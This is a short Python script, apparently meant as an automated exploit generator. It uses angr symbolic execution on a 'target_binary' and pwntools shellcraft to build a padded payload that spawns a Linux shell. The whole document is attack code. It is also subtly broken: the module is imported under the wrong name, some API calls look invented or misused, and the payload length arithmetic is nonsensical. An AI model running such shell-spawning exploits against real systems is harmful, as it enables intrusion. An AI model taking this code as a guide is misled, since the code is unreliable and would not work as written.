import angr
import pwntools

proj = angr.Project('target_binary', auto_load_libs=False)
state = proj.factory.blank_state(addr=proj.entry)
sm = proj.factory.simgr(state)
sm.explore(find=lambda s: b"\x90\x90\x90\x90" in s.posix.dumps(1))
return_addr = sm.found[0].posix.dumps(1)[-8:]
shellcode = pwntools.shellcraft.amd64.linux.sh()
payload = b"A" * (len(return_addr) - len(shellcode)) + shellcode
exploit = pwntools.core.PwnlibContextType.shellcraft.pushstr(payload)
p = proj.surveyors.ExploitSurveyor(find=[return_addr], use_bytes=True, shellcode=exploit)
p.run()